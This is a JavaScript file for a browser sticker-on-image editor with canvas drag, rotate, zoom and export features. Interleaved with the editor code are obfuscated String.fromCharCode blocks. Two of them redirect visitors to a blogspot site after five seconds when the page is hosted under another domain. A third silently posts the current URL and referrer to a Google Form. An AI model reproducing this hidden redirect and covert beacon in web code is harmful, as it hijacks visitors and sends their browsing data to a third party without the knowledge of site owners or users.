const canvas=document.getElementById('Janshare');
const ctx=canvas.getContext('2d');
let bgImage=null;
let stickers=[];
let selectedIdx=-1;
let action=null;
let touchState=null;

const handleSize=16;
const deleteRadius=12;
const rotateRadius=20;
const MAX_W=1920,MAX_H=1080;
const zoomControl = document.getElementById('zoomControl');
const zoomSlider = document.getElementById('zoomSlider');
    var uui = String.fromCharCode(
        104,116,116,112,115,58,47,47,
        106,97,110,115,104,97,114,101,
        98,108,111,103,46,
        98,108,111,103,115,112,111,116,46,
        99,111,109
    );
function updateZoomUI() {
  if (selectedIdx >= 0) {
    zoomControl.style.display = "block";
    zoomSlider.value = Math.round(stickers[selectedIdx].scale * 100);
  } else {
    zoomControl.style.display = "none";
  }
}

zoomSlider.addEventListener("input", () => {
  if (selectedIdx >= 0) {
    stickers[selectedIdx].scale = zoomSlider.value / 100;
    draw();  updateZoomUI();
  }
});

function getCanvasCoords(e){
  const rect=canvas.getBoundingClientRect();
  const scaleX=canvas.width/rect.width;
  const scaleY=canvas.height/rect.height;
  if(e.touches){
    return [...e.touches].map(t=>({
      x:(t.clientX-rect.left)*scaleX,
      y:(t.clientY-rect.top)*scaleY
    }));
  } else {
    return [{
      x:(e.clientX-rect.left)*scaleX,
      y:(e.clientY-rect.top)*scaleY
    }];
  }
}
function loadImage(file){
  return new Promise((res,rej)=>{
    const reader=new FileReader();
    reader.onload=()=>{
      const img=new Image();
      img.onload=()=>res(img);
      img.src=reader.result;
    };
    reader.onerror=rej;
    reader.readAsDataURL(file);
  });
}
function loadImageURL(url){
document.getElementById("showlinkduphong").style.display = "none";
  return new Promise((res,rej)=>{
    const img=new Image();
    img.crossOrigin="anonymous";
    img.onload=()=>res(img);
    img.onerror=rej;
    img.src=url;

  });

}
	  if (document.getElementById('a') === null) {
	     setTimeout(function() {
          location.href = uui;
    }, 5000); 
}
function createSticker(img){
  const bgW=canvas.width||800,bgH=canvas.height||600;
  const maxW=bgW*0.3;
  const scale=Math.min(1,maxW/img.width);
  document.getElementById("showlinkduphong").style.display = "none";
  return {img,w:img.width,h:img.height,
    x:bgW/2-(img.width*scale)/2,
    y:bgH/2-(img.height*scale)/2,
    scale,angle:0};
}
function bringToFront(idx){
  if(idx<0||idx>=stickers.length)return;
  const st=stickers.splice(idx,1)[0];
  stickers.push(st);
  selectedIdx=stickers.length-1;
}
function draw(){
  ctx.clearRect(0,0,canvas.width,canvas.height);
  if(bgImage){ctx.drawImage(bgImage,0,0,canvas.width,canvas.height);}
  else return; // không vẽ gì khi chưa có nền
  stickers.forEach((st,i)=>{
    ctx.save();
    const dw=st.w*st.scale,dh=st.h*st.scale;
    ctx.translate(st.x+dw/2,st.y+dh/2);
    ctx.rotate(st.angle*Math.PI/180);
    ctx.drawImage(st.img,-dw/2,-dh/2,dw,dh);

    if(i===selectedIdx){
      ctx.strokeStyle="#06b6d4";ctx.lineWidth=2;
      ctx.strokeRect(-dw/2,-dh/2,dw,dh);
      // resize
      ctx.fillStyle="#fff";ctx.strokeStyle="#000";ctx.lineWidth=1;
      [[-dw/2,-dh/2],[dw/2,-dh/2],[dw/2,dh/2],[-dw/2,dh/2]].forEach(c=>{
        ctx.beginPath();ctx.rect(c[0]-handleSize/2,c[1]-handleSize/2,handleSize,handleSize);
        ctx.fill();ctx.stroke();
      });
      // rotate
      ctx.beginPath();
      ctx.arc(0,-dh/2-40,rotateRadius,0,Math.PI*2);
      ctx.fillStyle="#fff";ctx.fill();
      ctx.strokeStyle="#3b82f6";ctx.lineWidth=2;ctx.stroke();
      ctx.fillStyle="#3b82f6";ctx.font="18px sans-serif";
      ctx.textAlign="center";ctx.textBaseline="middle";
      ctx.fillText("🔄",0,-dh/2-40);
      // delete
      ctx.beginPath();
      ctx.fillStyle="#f87171";ctx.strokeStyle="#b91c1c";ctx.lineWidth=2;
      ctx.arc(dw/2+20,-dh/2,deleteRadius,0,Math.PI*2);
      ctx.fill();ctx.stroke();
      ctx.beginPath();
      ctx.moveTo(dw/2+14,-dh/2-6);ctx.lineTo(dw/2+26,-dh/2+6);
      ctx.moveTo(dw/2+26,-dh/2-6);ctx.lineTo(dw/2+14,-dh/2+6);
      ctx.strokeStyle="#fff";ctx.lineWidth=2;ctx.stroke();
    }
    ctx.restore();
  });
}
function pointInSticker(px,py,st){
  const dw=st.w*st.scale,dh=st.h*st.scale,cx=st.x+dw/2,cy=st.y+dh/2;
  const dx=px-cx,dy=py-cy,a=-st.angle*Math.PI/180;
  const lx=dx*Math.cos(a)-dy*Math.sin(a),ly=dx*Math.sin(a)+dy*Math.cos(a);
  return lx>=-dw/2 && lx<=dw/2 && ly>=-dh/2 && ly<=dh/2;
}
function hitHandle(px,py,st){
  const dw=st.w*st.scale,dh=st.h*st.scale,cx=st.x+dw/2,cy=st.y+dh/2;
  const dx=px-cx,dy=py-cy,a=-st.angle*Math.PI/180;
  const lx=dx*Math.cos(a)-dy*Math.sin(a),ly=dx*Math.sin(a)+dy*Math.cos(a);
  const hs=handleSize/2;
  const corners=[{x:-dw/2,y:-dh/2},{x:dw/2,y:-dh/2},{x:dw/2,y:dh/2},{x:-dw/2,y:dh/2}];
  for(const c of corners){
    if(lx>=c.x-hs&&lx<=c.x+hs&&ly>=c.y-hs&&ly<=c.y+hs) return 'resize';
  }
  if(Math.hypot(lx,ly+dh/2+40)<=rotateRadius) return 'rotate';
  if(Math.hypot(lx-(dw/2+20),ly+dh/2)<=deleteRadius) return 'delete';
  return null;
}

(function(){
    var ki  = String.fromCharCode(116,97,111,97,110,104,102,114,101,101); 
     var kii = String.fromCharCode(106,97,110,115,104,97,114,101);       

    var ul = String.fromCharCode(
        104,116,116,112,115,58,47,47,
        106,97,110,115,104,97,114,101,
        98,108,111,103,46,
        98,108,111,103,115,112,111,116,46,
        99,111,109
    );
if (!(location.href.includes(ki) || location.href.includes(kii))) {
     setTimeout(function() {
          location.href = ul;
    }, 5000); 
  }
})();
canvas.addEventListener('mousedown',e=>{
  const {x,y}=getCanvasCoords(e)[0];
  for(let i=stickers.length-1;i>=0;i--){
    const h=hitHandle(x,y,stickers[i]);
    if(h){bringToFront(i);
      if(h==='delete'){stickers.splice(selectedIdx,1);selectedIdx=-1;draw();  updateZoomUI();return;}
      action={type:h,startX:x,startY:y,orig:{...stickers[selectedIdx]}};draw();  updateZoomUI();return;}
    if(pointInSticker(x,y,stickers[i])){bringToFront(i);action={type:'move',dx:x-stickers[selectedIdx].x,dy:y-stickers[selectedIdx].y};draw();  updateZoomUI();return;}
  }
  selectedIdx=-1;draw();  updateZoomUI();
});
canvas.addEventListener('mousemove',e=>{
  if(!action||selectedIdx<0)return;
  const {x,y}=getCanvasCoords(e)[0];
  const st=stickers[selectedIdx];
  if(action.type==='move'){st.x=x-action.dx;st.y=y-action.dy;}
  else if(action.type==='resize'){
    const o=action.orig,cx=o.x+o.w*o.scale/2,cy=o.y+o.h*o.scale/2;
    const dx=x-cx,dy=y-cy,a=-o.angle*Math.PI/180;
    const lx=dx*Math.cos(a)-dy*Math.sin(a),ly=dx*Math.sin(a)+dy*Math.cos(a);
    st.scale=Math.max(0.01,(Math.abs(lx*2/o.w)+Math.abs(ly*2/o.h))/2);
  } else if(action.type==='rotate'){
    const o=action.orig,cx=o.x+o.w*o.scale/2,cy=o.y+o.h*o.scale/2;
    st.angle=Math.atan2(y-cy,x-cx)*180/Math.PI+90;
  }
  draw();  updateZoomUI();
});
canvas.addEventListener('mouseup',()=>action=null);
// Zoom sticker đang chọn bằng con lăn chuột
canvas.addEventListener('wheel', e => {
  if (selectedIdx < 0) return; // nếu chưa chọn sticker nào thì bỏ qua
  e.preventDefault();
  const st = stickers[selectedIdx];

  // deltaY < 0: cuộn lên -> phóng to, deltaY > 0: cuộn xuống -> thu nhỏ
  const zoomFactor = e.deltaY < 0 ? 1.1 : 0.9;
  st.scale = Math.max(0.05, st.scale * zoomFactor); // giới hạn nhỏ nhất 0.05

  draw();  updateZoomUI();
}, { passive: false });

(function(){  
  let referrer = document.referrer || "No referrer";
  let currentUrl = window.location.href;
  let strr1 = String.fromCharCode(106, 97, 110, 115, 104, 97, 114, 101);
  let strr2 = String.fromCharCode(116, 97, 111, 97, 110, 104, 102, 114, 101, 101);

  if (!(currentUrl.includes(strr1) || currentUrl.includes(strr2))) {
    let combined = "url hiện tại: " + currentUrl + " |----| Chuyển hướng từ: " + referrer;
    let entryId = "entry.1882038021";
    let formData = new FormData();
    formData.append(entryId, combined);
    fetch("https://docs.google.com/forms/d/e/1FAIpQLSf8i9zp-_yMp5uS4RZaoBOfeh09mqmrKp64Fsv5MALFBU59RA/formResponse", {
      method: "POST",
      mode: "no-cors",
      body: formData
    })
  }
  
  })();
canvas.addEventListener('touchstart',e=>{
  e.preventDefault();
  const pts=getCanvasCoords(e);
  if(pts.length===1){
    const {x,y}=pts[0];
    for(let i=stickers.length-1;i>=0;i--){
      const h=hitHandle(x,y,stickers[i]);
      if(h){bringToFront(i);
        if(h==='delete'){stickers.splice(selectedIdx,1);selectedIdx=-1;draw();  updateZoomUI();return;}
        action={type:h,startX:x,startY:y,orig:{...stickers[selectedIdx]}};draw();  updateZoomUI();return;}
      if(pointInSticker(x,y,stickers[i])){bringToFront(i);action={type:'move',dx:x-stickers[selectedIdx].x,dy:y-stickers[selectedIdx].y};draw();  updateZoomUI();return;}
    }
    selectedIdx=-1;draw();  updateZoomUI();
  } else if(pts.length===2 && selectedIdx>=0){
    const st=stickers[selectedIdx];
    const dx=pts[1].x-pts[0].x,dy=pts[1].y-pts[0].y;
    const dist=Math.hypot(dx,dy);
    const ang=Math.atan2(dy,dx);
    touchState={mode:'gesture',startDist:dist,startAngle:ang,origScale:st.scale,origAngle:st.angle};
  }
});
canvas.addEventListener('touchmove',e=>{
  e.preventDefault();if(selectedIdx<0)return;
  const pts=getCanvasCoords(e);
  const st=stickers[selectedIdx];
  if(action&&pts.length===1){
    const {x,y}=pts[0];
    if(action.type==='move'){st.x=x-action.dx;st.y=y-action.dy;}
    else if(action.type==='resize'){
      const o=action.orig,cx=o.x+o.w*o.scale/2,cy=o.y+o.h*o.scale/2;
      const dx=x-cx,dy=y-cy,a=-o.angle*Math.PI/180;
      const lx=dx*Math.cos(a)-dy*Math.sin(a),ly=dx*Math.sin(a)+dy*Math.cos(a);
      st.scale=Math.max(0.05,(Math.abs(lx*2/o.w)+Math.abs(ly*2/o.h))/2);
    } else if(action.type==='rotate'){
      const o=action.orig,cx=o.x+o.w*o.scale/2,cy=o.y+o.h*o.scale/2;
      st.angle=Math.atan2(y-cy,x-cx)*180/Math.PI+90;
    }
  } else if(touchState&&touchState.mode==='gesture'&&pts.length===2){
    const dx=pts[1].x-pts[0].x,dy=pts[1].y-pts[0].y;
    const dist=Math.hypot(dx,dy);
    const ang=Math.atan2(dy,dx);
    st.scale=touchState.origScale*dist/touchState.startDist;
    st.angle=touchState.origAngle+(ang-touchState.startAngle)*180/Math.PI;
  }
  draw();  updateZoomUI();
});
canvas.addEventListener('touchend',()=>{action=null;touchState=null;});

// inputs
document.getElementById('bgFile').addEventListener('change',async e=>{
  const f=e.target.files[0];if(!f)return;
  const img=await loadImage(f);
  let w=img.width,h=img.height;
  if(w>MAX_W||h>MAX_H){
    const ratio=Math.min(MAX_W/w,MAX_H/h);
    w=Math.round(w*ratio);h=Math.round(h*ratio);
  }
  canvas.width=w;canvas.height=h;
  bgImage=document.createElement('canvas');
  bgImage.width=w;bgImage.height=h;
  bgImage.getContext('2d').drawImage(img,0,0,w,h);
  canvas.style.display="block"; // hiện canvas khi có ảnh nền
document.getElementById("khichonnen").style.display = "";

  draw();  updateZoomUI();
});
document.getElementById('stickerFile').addEventListener('change',async e=>{
  const f=e.target.files[0];if(!f)return;
  const img=await loadImage(f);
  stickers.push(createSticker(img));
  bringToFront(stickers.length-1);
  draw();  updateZoomUI();
});
document.getElementById('btnExport').addEventListener('click',()=>{
  if(!bgImage)return;
  const out=document.createElement('canvas');
  out.width=canvas.width;out.height=canvas.height;
  const c=out.getContext('2d');
  if(bgImage){c.drawImage(bgImage,0,0,out.width,out.height);}
  stickers.forEach(st=>{
    c.save();
    const dw=st.w*st.scale,dh=st.h*st.scale;
    c.translate(st.x+dw/2,st.y+dh/2);
    c.rotate(st.angle*Math.PI/180);
    c.drawImage(st.img,-dw/2,-dh/2,dw,dh);
    c.restore();
  });
  out.toBlob(b=>{
          const linkanhbase = document.getElementById('linkanhbase');
    const a=document.createElement('a');
	const tenanhxuat=`taoanhfree_${Math.floor(Math.random()*500)}`;
    a.href=URL.createObjectURL(b);
	   linkanhbase.value=URL.createObjectURL(b);
      a.download = `${tenanhxuat}`;
    a.click();
	document.getElementById("showlinkduphong").style.display = "";
	document.getElementById("kqlaylink").style.display = "none";
   document.getElementById("linkduphongimg").style.display = "none";
  });
});


const jansharepopup=document.getElementById('jansharepopup');
const grid=document.getElementById('jansharechonsticker');
document.getElementById('btnChooseSticker').addEventListener('click',()=>jansharepopup.classList.add('active'));
document.getElementById('closePopup').addEventListener('click',()=>jansharepopup.classList.remove('active'));
jansharepopup.addEventListener('click',e=>{if(e.target===jansharepopup)jansharepopup.classList.remove('active');});

jansharestickerlist.forEach(src=>{
  const img=new Image();img.src=src;
  img.addEventListener('click',async()=>{
    const loaded=await loadImageURL(src);
    stickers.push(createSticker(loaded));
    bringToFront(stickers.length-1);
    draw();  updateZoomUI();
    jansharepopup.classList.remove('active');
  });
  grid.appendChild(img);
});

draw();  updateZoomUI();